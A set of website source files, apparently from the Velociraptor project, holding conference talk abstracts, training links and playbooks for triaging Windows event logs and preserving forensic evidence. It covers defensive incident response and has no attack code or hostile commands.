By **Dan Banker**
Threat Response Team Lead at Motorola Solutions

With the recent rise in users working remotely, many security-related
processes have had to adapt. One of these is capturing a forensic
image for analysis. Acquiring a bit-for-bit copy of a 500 MB+ disk
over the network can be impractical, and obtaining the physical drive
may introduce unacceptable delays. I will outline a process for using
EDR to deploy the Velociraptor standalone executable and capture a
triage image under 500MB in size. The executable can be deployed and
the image retrieved in under 30 minutes, and will hand your team the
most important forensic artifacts to start the investigation. I'll
also cover using Winpmem in a similar process to retrieve memory, and
an alternate triage image process for Linux machines.

<iframe width="560" height="315" src="https://www.youtube.com/embed/eL2YZ1CoKtQ" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

[Slides](https://drive.google.com/file/d/1pmhMxnXwD5VEQ8IyFdxUsMsqCIfpYuvN/view?usp=sharing)

## Using DinoSOARLab to Uncover Adversary Actions and Orchestrate Rapid Response
By **Wes Lambert** - Principal Engineer, Security Onion Solutions

Have you ever worked in a DinoSOAR lab? If not, now’s your chance!

In this presentation, we'll discuss integration of Velociraptor with
Security Onion, a free and open platform for enterprise security
monitoring, intrusion detection, threat hunting, and log management.

Along with other tools, the integration will assist in facilitating
contextual enrichment, orchestration, and automation by tying together
host, network, and other telemetry in an effort to paint a more
accurate picture of adversary activity in a computer network.

While Velociraptor provides excellent insight and the ability to
gather and process forensic evidence quickly and easily, when paired
with passive network analysis from tools like Suricata (NIDS alerts),
Zeek (connection/protocol-specific/transaction logs), Google
Stenographer (full packet capture), we can glean important
associations that otherwise might not have been noticed, more
effectively scope an incident, and potentially come to a conclusion
much more quickly during an investigation. We can pore over, sort, and
create visualizations to correlate activity and build relationships
between artifact/host data from Velociraptor and network data provided
by Security Onion.

To track our investigations, we can create cases, adding observables
and enriching the data made available by Velociraptor and other tools,
or kick off additional hunts as needed. In this way, we’re going
full-circle from Velociraptor to Security Onion and so on, with each
complementing the other to provide additional context and
capability. Attendees will walk away with an understanding of not just
how they can benefit from integration of Velociraptor with Security
Onion, but with other stacks and technologies as well.

<iframe width="560" height="315" src="https://www.youtube.com/embed/5RxFjQc652w" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

[Slides](https://drive.google.com/file/d/15jf6pHkYq5Gu9ih-iAaKKtemyX9Tp4pi/view?usp=sharing)

## Cloud Native Velociraptor
By **Mike Cohen** - Digital Paleontologist

Velociraptor is fast becoming the default choice for a DFIR and
continuous monitoring solution. While Velociraptor was originally
designed for ease of deployment, targeting smaller organizations, as
the tool matures and gains more enterprise ready features there is a
growing need to cater for very large cloud native deployments (in the
millions of endpoints).

This talk introduces a new project based on Velociraptor called "Cloud
Raptor". This experimental new project is an attempt to implement
Velociraptor using cloud native technologies, namely S3 and Opensearch
as well as using AWS Lambda functions. The talk will cover some of the
architectural aspects of the Velociraptor code base that make it
possible to reimplement core functionality easily.

The new architecture makes some Velociraptor features easier to
implement, while other features are more difficult to implement. This
talk will discuss the pros and cons of this approach since it is
currently not a complete feature for feature
implementation. Nevertheless, having an additional, highly scalable
version of Velociraptor that can be used in some situations is very
useful to the Velociraptor ecosystem.

<a href="https://present.velocidex.com/presentations/velocon_2022_cloud_velo/" target="_blank">
    Slides!
</a>
<p>
<iframe width="560" height="315" src="https://www.youtube.com/embed/tdsOrU_fxXE" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

## Velociraptor and Law enforcement
By **Luke Fardell** - Director of DFIR, Control Risks

Dealing with an incident which results in the prosecution of a threat
actor when all the data was gathered using Velociraptor. The talk
focuses on the challenges faced when dealing with the courts and the
police when stepping away from the normal full disk imagery processes
the courts are used to.

I used Velociraptor during a network breach for a client, the attack
resulted in all sys admin accounts being removed from the AD. The
threat actor then disabled the buildings access controls and
specifically the server room door controls. The threat actor then
began to destroy the datacentre by mass deleting files and wiping
systems.  The attack was thwarted mid-way through by the IT staff
using an emergency over-ride to bypass the door controls and used a
metal bar to prise open the door and pull the network cables out. This
sounds like something from a movie but it genuinely happened.

The analysis using velociraptor uncovered an account that was created
3 months prior to the attack in the AD that was used to access the
VPN. Cross checking with HR records a former sys admin was fired on
the same day. The threat actor also failed to log into some systems
and ended up re-enabling the former sys admins account to access the
door controls. During analysis we extracted the AD and obtained the
password hash for the new accounts created, the passwords we relevant
to the former employee. The firewall analysis identified a home
broadband IP address was used and also the IP address of a fishing
club frequented by the former employee.  The case is currently with
the UK courts and police. It would be great to share my experiences
dealing with law enforcement and explaining the deployment of
velociraptor and how it collects data. Specifically having to explain
the lack of a full traditional forensic image which was not possible
in this situation. The client rebuilt the network in haste and we had
to rely on the data we collected via velociraptor.  The case is still
on going and I am giving evidence and statements currently. My main
point of contention is that the lawyers are used to only dealing with
full disk images (e01 with hashes etc.) This case involved thousands
of endpoints during the deployment and the systems we gathered data
from using velociraptor had to be rebuilt over the weekend. Changing
the lawyers mindset was difficult but the process was documented using
the server side telemetry which showed our working processes and we
were able to document the analysis effectively. Also the hashing of
individual files on upload helped massively and gave the law
enforcement comfort.

<iframe width="560" height="315" src="https://www.youtube.com/embed/JvoweIS4c9g" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

[Slides](https://drive.google.com/file/d/1voM5HDWOE4aTrdf0_w1oRzg8YZ5nPi9x/view?usp=sharing)

## Mac Response – The Good, the Bad, and the Ugly
By **Mike Pilkington**

Mac adoption is on the rise. Gartner reported 8.5% market share for
macOS in the enterprise in 2021, and the rate of adoption continues to
rise. With Macs becoming more common across more organizations, it's
important for security teams to have the ability to respond
effectively. Velociraptor offers an excellent opportunity to do that!
However, deploying and using security tooling like Velociraptor comes
with a unique set of challenges on Macs. In particular, features such
as System Integrity Protection (SIP) and Transparency, Consent, and
Control (TCC) make rapid response difficult if responders have not
planned ahead. In this talk, we’ll cover how to prepare to clear these
hurdles so that you have solid visibility when responding to Mac hosts
in your network. We’ll also look at useful areas for analyzing
potential intrusions against Macs, and how Velociraptor can speed up
the triage process at scale.

<iframe width="560" height="315" src="https://www.youtube.com/embed/-ask9Oe6ovo" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

[Slides](https://drive.google.com/file/d/1_Y4IAxxxePV4TrhtamWQXXMZ723z7KUC/view?usp=sharing)

## Purple Teaming with ARTifacts
By **Wes Lambert** - Principal Engineer, Security Onion Solutions

Do you currently engage in purple teaming, or would like to get
started? Would you like a way to make deployment of Atomic Red Team
tests faster, easier, and more streamlined? How about determining
detection efficacy?

All of this and more can be made possible by leveraging Atomic Red
Team tests within Velociraptor artifacts. No kidding, we can implement
these tests within an artifact, then have them run on an endpoint,
without user intervention. Furthermore, we can leverage detection
rules from within Velociraptor to catch the simulated attack activity
and gauge the effectiveness of our detections.

Attendees will walk away from this presentation with several examples
of how they immediately leverage Atomic Red Team tests and catch
execution of those tests through Velociraptor to evaluate their
detection capability and improve the security of their enterprise.

<iframe width="560" height="315" src="https://www.youtube.com/embed/9HmYNDTIsJ0" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

[Slides](https://drive.google.com/file/d/1nRqqodiAn1-eGw5RWOIHaI6FxS3EROwb/view?usp=sharing)

---END OF FILE---

======
FILE: /content/presentations/2022_sans_summit/_index.md
======
---
title: SANS Threat Hunting Summit 2022
menutitle: SANS Summit 2022
weight: 65
---

[Full agenda](https://www.sans.org/webcasts/threat-hunting---part-of-the-dfir-summit---solutions-track/)

## How to unlock achievements in Threat Hunting using Velociraptor

Velociraptor is the open source DFIR framework that everyone is
talking about! Have you ever needed to respond to an incident in a
large enterprise network? Have you wondered how many of your 10,000
endpoints are compromised? You know you should be hunting for common
forensic artifacts but how do you do it in a scalable way, in a
reasonable time? Well… now you can!

This session will introduce Velociraptor and cover the recent
capabilities investigating and monitoring the security of Linux and
Windows hosts. Velociraptor’s superpower is its flexible and powerful
query language called VQL. Using VQL we can implement novel detection,
hunt for compromise and automate all our response needs. We will cover
common use cases such as hunting for ssh keys across large networks.

We will also discuss the advantages and disadvantages of the
Velociraptor philosophy: Push processing to the endpoint rather than
transfer raw data for local processing.

<iframe src="https://present.velocidex.com/presentations/sans_2022/index.html" frameborder="0" width="980px" height="600px" allowfullscreen="true" mozallowfullscreen="true" webkitallowfullscreen="true"></iframe>

[Full Screen](https://present.velocidex.com/presentations/sans_2022/index.html)

---END OF FILE---

======
FILE: /content/presentations/2021_blueteam_village/_index.md
======
---
title: Blue Team Village 2021
menutitle: BTV 2021
weight: 18
no_menu: true
---

This talk was given at the Blue Team Village at DefCon 2021

## Video

<iframe width="560" height="315" src="https://www.youtube.com/embed/TBWisjyP3zY" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

## Slides

<iframe src="https://docs.google.com/presentation/d/e/2PACX-1vRm701pui2YnVOMl-9lcB-aNVHH9aKGCK7vGL46v05OjYFKvWHZO2fqEY3j5luqtxvr_kGXbyF2tQC4/embed?start=false&loop=false&delayms=3000" frameborder="0" width="960" height="569" allowfullscreen="true" mozallowfullscreen="true" webkitallowfullscreen="true"></iframe>>

---END OF FILE---

======
FILE: /content/presentations/2023_auscert/_index.md
======
---
title: Auscert Workshop 2023
menutitle: Auscert 2023
weight: 90
no_menu: true
---

This workshop will take place on the 10th May 2023.

[Full agenda](https://conference.auscert.org.au/sessions/incident-response-with-velociraptor/)

## Incident Response with Velociraptor

With the increased prevalence of CyberCrime in recent years the
likelihood that your organization will be targeted by organized crime
groups has increased dramatically. Professional Cyber criminals are
proficient and agile with typical dwell times measured in hours, not
weeks or months as was common in the past. An unsuccessful incident
response exercise can result in massive losses to the organization
with critical data either ransomed or exfiltrated.

Don’t worry – Velociraptor has your back! This tutorial will introduce
you to this powerful open source framework capable of responding to
many thousands of endpoints within minutes. Velociraptor has come onto
the scene a few years ago and is getting better all the time. It is
now the obvious choice for an open source Digital Forensic and
Incident Response (DFIR) tool.

Velociraptor’s superpower is its flexible and powerful query language
called VQL. Using VQL we can implement novel detection, hunt for
compromise and automate all our response needs. We cover some common
use cases such as hunting for ssh keys across large networks or
automatic escalation when suspicious events are discovered. We also
cover real time monitoring of the endpoint (for example webshell
detection via process parent/child analysis) and how VQL can be used
to build sophisticated alerting around process execution chains,
network connections and even bash instrumentation of the command line,
all done at scale with the click of a few buttons.


<iframe src="https://present.velocidex.com/presentations/2023-auscert/index.html" frameborder="0" width="980px" height="600px" allowfullscreen="true" mozallowfullscreen="true" webkitallowfullscreen="true"></iframe>

[Full Screen](https://present.velocidex.com/presentations/2023-auscert/index.html)

---END OF FILE---

======
FILE: /content/presentations/2022_tech_user_group_cbr/_index.md
======
---
title: Tech Users Group 2022
menutitle: Tech Users Group 2022
weight: 45
no_menu: true
---

## Digging Deeper with Velociraptor

[Join us for a Live Workshop on Digging Deeper with Velociraptor | Cliftons Canberra
Thursday, 28 July 2022 @ 4pm - 6:30pm AEST](https://information.rapid7.com/digging-deeper-velociraptor-workshop_registration.html)

With an increasingly mobile and remote workforce, the old manual
approach to incident response does not scale. The dwell time of
ransomware operators is now measured in days and weeks, making the
need for fast effective response critical.

Welcome to the age of Velociraptor - the new open source DFIR
visibility tool everyone has been talking about! Velociraptor is
powered by a flexible and powerful query language, allowing you to
rapidly go from an advisory or a new hunting idea, to getting
actionable data in minutes. Then, you can leverage the power of
Velociraptor’s remediation and detection capabilities to ensure the
compromise is cleaned up and never happens again!

Join us on Thursday 28 July at Cliftons Canberra for a live workshop
and demo session followed by some networking drinks and nibbles. This
workshop is an introduction to hunting and incident response with
Velociraptor for information security professionals.

Register now to confirm your place. Spaces are limited, so please
register early.

We look forward to seeing you there!

<iframe src="https://docs.google.com/presentation/d/e/2PACX-1vR3B1jzUXQWKTOxojzarFybSFwedHxpJrrCGJ_Wrvnuj_qsTlpKWkAh01RTuXy1htT5FkG4XcCXOSjn/embed?start=false&loop=false&delayms=3000" frameborder="0" width="1280" height="749" allowfullscreen="true" mozallowfullscreen="true" webkitallowfullscreen="true"></iframe>

---END OF FILE---

======
FILE: /content/presentations/2022_linuxconf_au/_index.md
======
---
title: Linux Conf Au 2022
linktitle: Linux Conf Au 2022
weight: 20
---

This talk was given at the Linux Conference 2022 remotely https://lca2022.linux.org.au/schedule/presentation/58/

## Abstract

Velociraptor is the new open source DFIR framework that everyone is
talking about! Have you ever needed to respond to an incident in a
large enterprise network? Have you wondered how many of your 10,000
endpoints are compromised? You know you should be hunting for common
forensic artifacts but how do you do it in a scalable way, in a
reasonable time? Well… now you can!

This talk will introduce Velociraptor and cover specifically the
recent capabilities investigating and monitoring the security of Linux
hosts. Velociraptor's superpower is its flexible and powerful query
language called VQL. Using VQL we can implement novel detection, hunt
for compromise and automate all our response needs. We cover some
common use cases such as hunting for ssh keys across large networks or
automatic escalation when suspicious events are discovered. We also
cover real time monitoring of the endpoint (for example webshell
detection via process parent/child analysis) and how VQL can be used
to build sophisticated alerting around process execution chains,
network connections and even bash instrumentation of the command line,
all done at scale with the click of a few buttons.

## Video

<iframe width="560" height="315" src="https://www.youtube.com/embed/0Cs4rj-_FD4" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

## Slides

<iframe src="https://docs.google.com/presentation/d/e/2PACX-1vS_EFYmZwPF_UCJANczTU7ATNhqPiV9SiN3pLx5hpZIW8HmzgleOhN0Kzq8EKWZGBIGD5E09EoVoIM3/embed?start=false&loop=false&delayms=3000" frameborder="0" width="1280" height="749" allowfullscreen="true" mozallowfullscreen="true" webkitallowfullscreen="true"></iframe>

---END OF FILE---

======
FILE: /content/presentations/2023_everything_open/_index.md
======
---
title: Everything Open Conference 2023
menutitle: EverythingOpen 2023
weight: 85
---

[Full agenda](https://2023.everythingopen.au/schedule/presentation/22/)

# Incident Response with Velociraptor

With the increased prevalence of CyberCrime in recent years the
likelihood that your organization will be targeted by organized crime
groups has increased dramatically. Professional Cyber criminals are
proficient and agile with typical dwell times measured in hours, not
weeks or months as was common in the past. An unsuccessful incident
response exercise can result in massive losses to the organization
with critical data either ransomed or exfiltrated.

Don't worry - Velociraptor has your back! This tutorial will introduce
you to this powerful open source framework capable of responding to
many thousands of endpoints within minutes. Velociraptor has come onto
the scene a few years ago and is getting better all the time. It is
now the obvious choice for an open source Digital Forensic and
Incident Response (DFIR) tool.

Velociraptor's superpower is its flexible and powerful query language
called VQL. Using VQL we can implement novel detection, hunt for
compromise and automate all our response needs. We cover some common
use cases such as hunting for ssh keys across large networks or
automatic escalation when suspicious events are discovered. We also
cover real time monitoring of the endpoint (for example webshell
detection via process parent/child analysis) and how VQL can be used
to build sophisticated alerting around process execution chains,
network connections and even bash instrumentation of the command line,
all done at scale with the click of a few buttons.


<iframe src="https://present.velocidex.com/presentations/everything_open_2023/index.html" frameborder="0" width="980px" height="600px" allowfullscreen="true" mozallowfullscreen="true" webkitallowfullscreen="true"></iframe>

[Full Screen](https://present.velocidex.com/presentations/everything_open_2023/index.html)

---END OF FILE---

======
FILE: /content/presentations/2022_dfrws_apac/_index.md
======
---
title: DFRWS APAC 2022
menutitle: DFRWS APAC 2022
weight: 80
---

At DFRWS APAC 2022, Mike gave a 4 hour workshop. Below you will find the
slides.

## Workshop: Velociraptor: Digging Deeper (4 Hours)

Velociraptor is an advanced open source digital forensic and incident
response tool that enhances your visibility into your
endpoints. Featuring scalable architecture it makes it possible to
hunt for forensic artifacts across large networks in minutes.

This workshop is an introduction to Velociraptor and how DFIR
practitioners can leverage the Velociraptor Query Language (VQL) to
implement novel detections in minutes.

You will download and install Velociraptor, then deploy a new
deployment and become familiar with the GUI. Experience the power of
scaling a hunt across a large network (over 1,000 endpoints). We then
continue to post process the data to quickly identify anomalies.

Specifically, we will looking at the new Velociraptor dead-disk
analysis mode which allows Velociraptor to be used on more traditional
disk images. This way we can reuse our VQL artifacts on live systems,
as well as disk images. We will also look at the limitations of this
technique.

We cover some case studies in modern DFIR techniques exposing
artifacts such as hunting memory for Cobalt Strike beacons, detecting
lateral movement through forensic artifacts, and leveraging ETW to
gain deeper visibility of endpoint activity.

This workshop will be hands on and include examples you should run on
your own windows VM. All you need to participate is a Windows VM
(e.g. a cloud instance or local VM).

Participants will learn
1. How to install Velociraptor locally
2. The basics of the Velociraptor Query Language (VQL)
3. How to apply community queries from the Artifact Exchange
4. Hunting large number of machines for compromise in minutes
5. Use Velociraptor artifacts on hard disk images.

Participants will need their own windows VM or cloud machine (with
admin level access) and will download Velociraptor from Github to
install it on that machine.

There will also be a small disk image to play with which should not
take too long to download.

https://dfrws.org/presentation/velociraptor/

<iframe width="980px" height="600px" src="https://present.velocidex.com/presentations/dfrws_apac_2022/" frameborder="0" ></iframe>

[Full Screen](https://present.velocidex.com/presentations/dfrws_apac_2022/)

---END OF FILE---

======
FILE: /content/presentations/2022_auscert/_index.md
======
---
title: Auscert Workshop 2022
menutitle: Auscert 2022
weight: 35
---

At Auscert 2022, The Velociraptor team gave a 4 hour workshop and a
Presentation. Below you will find the slides.

## Talk: I can see you! - Improving detection efficiency on the endpoint…

With the rise of cybercrime and reduced dwell time before compromise,
the importance of fast and effective incident response and detection
has never been more evident. Much of current detection technology
relies on collecting selected events from the endpoint, forwarding
them to a central SIEM, where data mining techniques are applied on
large volumes of data to detect compromises. This approach is limited
in both scalability and in the limited types of forwarded events
available to the SIEM for detection.

In this talk we explore some less common event sources, in particular,
the Event Tracing for Windows (ETW) providers that go further than
typical process/registry modifications logs. To illustrate, we
describe some case studies, such as process parent spoofing, which is
difficult to detect using traditional methods.

Tapping into ETW providers increases the total volume of forwarded. To
address this problem, the industry is moving towards on-host
detection. Inspecting the events on the endpoint itself reduces the
need to forward all events, whilst increasing the detection
efficiency.

Finally, we cover some of the limitations of ETW as a detection
technology. Like all technologies, ETW can also be used to advantage
the adversaries. We discuss some of the countermeasures to malicious
ETW use and how to detect such use in practice.

For this talk, we look at the Velociraptor open-source endpoint
visibility platform as an illustrative example.

The takeaway for attendees:

1. Industry trend is to move more of the detection and filtering to
   the endpoint instead of simply forwarding large volumes of logs to
   a central SIEM

2. There are many more useful event sources than the traditional
   process/registry modification events available through ETW

3. ETW is not a magic bullet - it has some practical limitations but
   it is useful to understand and apply for modern detection.


<iframe src="https://docs.google.com/presentation/d/e/2PACX-1vTsDqy_0Vy1SzV3kQ_j5rfl3S5xL1pwKSLHat73VBFgSe_cNNTo80Ds2cJNad2wt588Al_29Vudtieg/embed?start=false&loop=false&delayms=3000" frameborder="0" width="1280" height="749" allowfullscreen="true" mozallowfullscreen="true" webkitallowfullscreen="true"></iframe>

<iframe width="560" height="315" src="https://www.youtube.com/embed/lfkHBzXqA1g" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

## Workshop: Digging Deeper with Velociraptor (Half Day)

With an increasingly mobile and remote workforce the old manual
approach to incident response does not scale. The dwell time of
ransomware operators is now measured in days and weeks, making the
need for fast effective response critical.

Welcome to the age of Velociraptor - the new open source DFIR
visibility tool everyone has been talking about! Velociraptor is
powered by a flexible and powerful query language, allowing you to
rapidly go from an advisory or a new hunting idea to getting
actionable data in minutes. Then you can leverage the power of
Velociraptor's remediation and detection capabilities to ensure the
compromise is cleaned up and never happens again!

This workshop is an introduction to hunting and incident response with
Velociraptor for information security professionals. You will download
and install Velociraptor, then deploy a new deployment and become
familiar with the GUI. Experience the power of scaling a hunt across a
large network (over 1,000 endpoints). We then continue to post process
the data to quickly identify anomalies.

We cover some case studies in modern DFIR techniques exposing
artifacts such as hunting memory for Cobalt Strike beacons, detecting
lateral movement through forensic artifacts, and leveraging ETW to
gain deeper visibility of endpoint activity.

This workshop will be hands on and include examples you should run on
your own windows VM. All you need to participate is a Windows VM
(e.g. a cloud instance or local VM).

Participants will learn:
1. How to install Velociraptor locally
2. The basics of the Velociraptor Query Language (VQL)
3. How to apply community queries from the Artifact Exchange
4. Hunting large number of machines for compromise in minutes
5. Create offline collectors for responding to networks without
   installing the Velociraptor agent

This talk was given at the Annual Auscert conference as a long form (4h) workshop
https://conference.auscert.org.au/program/


<iframe src="https://docs.google.com/presentation/d/e/2PACX-1vTKbAGMDDAhgTn33FbTXPGY8gYlL1ueCoIn-gERwbxXyRdyadKOcg9ho1Y-RGUmi4MbbwVe1g5Xszr2/embed?start=false&loop=false&delayms=3000" frameborder="0" width="1280" height="749" allowfullscreen="true" mozallowfullscreen="true" webkitallowfullscreen="true"></iframe>

---END OF FILE---

======
FILE: /content/presentations/2021_osdfc/_index.md
======
---
title: Open Source Digital Forensic Conference 2021
menutitle: OSDFC 2021
weight: 15
no_menu: true
---

This talk was given at the Open Source Digital Forensic conference 2021 https://www.osdfcon.org/events_2021/velociraptor/

## Video
<iframe width="560" height="315" src="https://www.youtube.com/embed/8AQFNAICajE" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>


## Slides

<iframe src="https://docs.google.com/presentation/d/e/2PACX-1vSiSWr-TVMn40D71vndoFJxV_SlL88tsBkO5uxj9VIbr3z0X5-pOs4Q-k9Y4jxusD7ja7aT-SnK5FZr/embed?start=false&loop=false&delayms=3000" frameborder="0" width="1280" height="749" allowfullscreen="true" mozallowfullscreen="true" webkitallowfullscreen="true"></iframe>

---END OF FILE---

======
FILE: /content/training/_index.md
======
---
menutitle: "Training"
title: "Training Resources"
date: 2021-06-12T14:03:59Z
draft: false
weight: 90
pre: <i class="fas fa-graduation-cap"></i>
---

## Scheduled courses

_We currently have no courses scheduled._

## Training course slides

Click [here](https://training.velociraptor.app/) to view in a new tab.

<iframe name="training slides" src="https://training.velociraptor.app/" frameborder='no' allowtransparency='true'
allowfullscreen scrolling='no' style="display:block;overflow:hidden;overflow:hidden;height:120vh;width:100%;top:0px;left:0px;right:0px;bottom:0px;padding:20px;zoom: 0.75; -moz-transform: scale(0.75); -moz-transform-origin: 0 0;" height="100vh" width="100%"></iframe>

## Training course videos

The full video playlist is available
[here](https://www.youtube.com/playlist?list=PLz4xB83Y3Vbjtqr_ttOkBWZZ_ewEVVPXQ)
on YouTube.

{{% notice info %}}

Please note that these videos are not up to date with the
[latest version]({{< ref "/downloads/" >}}).
The slide deck above is more recent and contains additional sections which don't
have corresponding videos.

{{% /notice %}}

{{< youtube class="youtube" title="Velociraptor Installation and Overview" id="70CBB9MdNWM" >}}


---END OF FILE---

======
FILE: /content/training/playbooks/_index.md
======
---
menutitle: "Playbooks"
title: "Playbooks"
date: 2024-06-12T14:03:59Z
draft: false
weight: 150
pre: <i class="fas fa-play"></i>
no_edit: true
disableToc: false
no_children: true
noDisqus: true
outputs:
- html
- RSS
---

Velociraptor is an incredibly powerful tool, but sometimes it is hard
to know where to start. This page aims to help newcomers to
Velociraptor by presenting a set of playbooks to use when faced with
certain tasks.

{{% children description=True %}}

---END OF FILE---

======
FILE: /content/training/playbooks/triage-logs/_index.md
======
---
title: "Triaging Logs"
description: |
    An endpoint is suspected of being compromised but you dont know
    exactly what happened. You want to get an initial idea by examining
    the logs on the actual endpoint.

tags:
- triage
- preservation
---

## Scenario

An endpoint is suspected of being compromised but you dont know
exactly what happened. You want to get an initial idea by examining
the logs on the actual endpoint.

## Main takeaways

1. This technique is similar to forwarding logs to a SIEM and applying
   signatures.
2. However we can choose very noisy signatures here
3. We use stacking to quickly categorize the types of activity that
   happens on the endpoint.

## Steps to take

Some common artifacts that are used for `Triaging Logs`

1. `Windows.Hayabusa.Rules` should be imported using `Server.Import.CuratedSigma`
2. `Exchange.Windows.EventLogs.Hayabusa` should be imported from the
   artifact exchange.

### Importing Windows.Hayabusa.Rules

1. Select the `Server Artifacts` from the sidebar.
2. Add a collection, search for `Server.Import.CuratedSigma` and
   import the `Windows.Hayabusa.Rules`. This will import the latest
   version of the artifact.

This artifact uses the built in `Sigma Engine` in Velociraptor. The
artifact packages the curated `Hayabusa` rules in a convenient
artifact. Rules are categorized by `RuleLevel` and `RuleStatus` which
generally try to balance how noisy a rule against its detection
efficacy.

![Sigma workflow in Velociraptor](velociraptor_sigma_flow.svg)

Because we are trying to triage the endpoint, we actually want to see
all the hits, even if they are noisy. We will apply stacking later to
quickly triage the type of activity on the endpoint. So in this case
we should select to apply all the rules.

![Applying all Sigma Rules](all_rules.png)

Once the artifact is collected from the endpoint we can stack the hits
in the GUI:

1. Update the notebook to remove the `LIMIT 50`. This will select all
   rows in one table. Typically there should be many thousands of
   rows because we added all the noisy rules.
2. Sort by the rule `Title`. Hover the mouse on the column header and
   click the `Sort` button.
3. Once the column is sorted, the stacking button should appear.

![Stacking a column](stacking_a_column.png)

4. Clicking the stacking button will show a summary of the different
   rules matching and a count of how many times each rule made a hit.

![Viewing column summaries](viewing_column_stack.png)

5. Clicking on any of the rules navigates the table to the list of
   rules that actually hit.

![Viewing common rows](viewing_common_rows.png)

Using this technique it is possible to quickly identify the types or
categories of activity on the endpoint and see the most suspicious
rules. Due to the stacking we dont need to review each individual hit,
but only the different types of rules.

For example, say we see a rule description a `PsExec` lateral
movement, we can quickly identify if `PsExec` is expected for this
environment, or does it represent a potential threat. If I identify
the rule as important, I can then review each instance to get more
information about what commands were run.

## Using the Exchange.Windows.EventLogs.Hayabusa

The `Exchange.Windows.EventLogs.Hayabusa` artifact is available in the
artifact exchange. This artifact uses an external binary `Hayabusa` to
evaluate the `Sigma` rules from the `Hayabusa` project.

Post processing and analysing the results from this artifact is
similar to the procedure described above.


## Discussion and limitations

This technique is similar to many SIEMs which forward event logs from
the endpoint and apply matching rules. There are some fundamental
differences though:

1. SIEMs typically only forward a small subset of logs since the more
   logs are collected the more data the SIEM backend needs to
   handle. Typically SIEMs forward logs such as `Sysmon Process
   Execution` but do not forward other logs for example `BITS Client
   Operational Logs`.

2. SIEM rules are also written to ensure they have a low false
   positive rate. This means that suspicious activity in one
   environment which is common in another setting, might not trigger a
   detection. By stacking on all noisy rules we get to decide for
   ourselves if a particular rule is acceptable for this environment.

   For example an administrator RDP login may be perfectly normal in
   some environments but a red flag in others!  SIEM detections are
   rarely tuned to the environment.

3. A SIEM may not be present or well tuned, in a particular
   environment. Running the `Sigma` log triaging workflow can
   compensate for the lack of a SIEM.

4. Data retention is different from a SIEM. Typically SIEMs only
   maintain logs for limited time (sometimes as low as a month). On
   the other hand log files are typically rotated based on size. This
   means that sometimes logs will be present on the endpoint for
   longer than in the SIEM, while other times the SIEM will contain
   logs that were already rotate on the endpoint.

5. Because this technique relies on locally stored logs, it is
   susceptible to logs being cleared by attackers.

## Real time monitoring

As an additional step you can enable the `Windows.Hayabusa.Monitoring`
artifact for real time detection of the same `Sigma` rules. This can
provide coverage for any future compromises

---END OF FILE---

======
FILE: /content/training/playbooks/preservation/_index.md
======
---
title: "Preserving Forensic Evidence"
description: |
    A compromised endpoint is likely to be destroyed. You want to preserve raw files until you have an opportunity to analyse them later.

tags:
- preservation
- acquisition
---

## Scenario

As a system administrator you have a high level of confidence a
certain endpoint is compromised. You wish to preserve critical
evidence while arranging for a more experienced DFIR professional to
examine the evidence.

## Main takeaways

1. This technique is a "shotgun" approach - it typically collects a
   lot of data.
2. Not very targeted.
3. Does not scale to many endpoints - use when very confident an
   endpoint is compromised.
4. DFIR skill required - LOW.

## Steps to take

Some common artifacts that are used in a preservation collection:

1. `Windows.KapeFiles.Targets` - collects files such as `$MFT`, log files etc.
2. `Windows.Memory.Acquisition` - collects a physical memory image.

### If Velociraptor is already installed on the endpoint

For collecting from a single endpoint

1. Search for the client you want to acquire from the main search screen.
2. Select `Collected Artifacts` from the sidebar, then select `New
   Collection` from the toolbar.
3. For Windows systems, select `Windows.KapeFiles.Targets`.
4. Select the `BasicCollection` or `Kape Triage` or `SANS Triage`
   targets. These targets select the most common raw files used by
   DFIR analysts.
5. This artifact can collect a large amount of data, we recommend to
   place resource limits to ensure that collection is not too
   excessive.

![Selecting the Windows.KapeFiles.Targets artifact](kape_targets.png)

If you will have a number of endpoints to collect you can use a hunt
to combine the data together:

1. In the `Hunt Manager` screen, create a new hunt. Restrict the hunt
   to a label `acquisition`.
2. Proceed to collect the same artifacts as above
3. As the investigation proceeds, when you find a client that warrants
   a preservation collection, simply add a label `acquisition` to the
   client. The `Windows.KapeFiles.Targets` will be automatically
   scheduled on this client.
4. You can view all acquired clients in the hunt overview page, and
   create a large zip export of all preserved files.

{{% notice warning "Ensure the hunt is restricted by labels!" %}}

Make sure this hunt is restricted by labels! If it is not, it will be
scheduled on all clients and may result in a lot of data being
transferred to the server - this can result in the server's bandwidth
being saturated, disk becoming full or server becoming unresponsive.

If this happens you can stop the hunt in the GUI which will cancel all
in-flight collections and eventually recover the server's bandwidth.

{{% /notice %}}

### If Velociraptor is not installed on the endpoint

If Velociraptor is not already installed on the endpoint, you can use
an `offline collector`. The Velociraptor `Offline Collector` is a
preconfigured version of Velociraptor which can run on the endpoint
and write all raw files into a ZIP archive.

![Creating an offline collector](offline_collector.png)

You can use a number of methods to push the offline to collection to
the endpoint:

1. Use an existing EDR or endpoint security product to run the binary
   and retrieve the collected ZIP file.
2. Use Group Policy to schedule a task that runs the collector from a
   remote share.
3. Use `WinRM` or `PsExec` to run the collector remotely (by careful
   of pass the hash type attacks though).

We recommend using the X509 encryption scheme to store the raw data to
an encrypted container. This helps to protect it in transit.

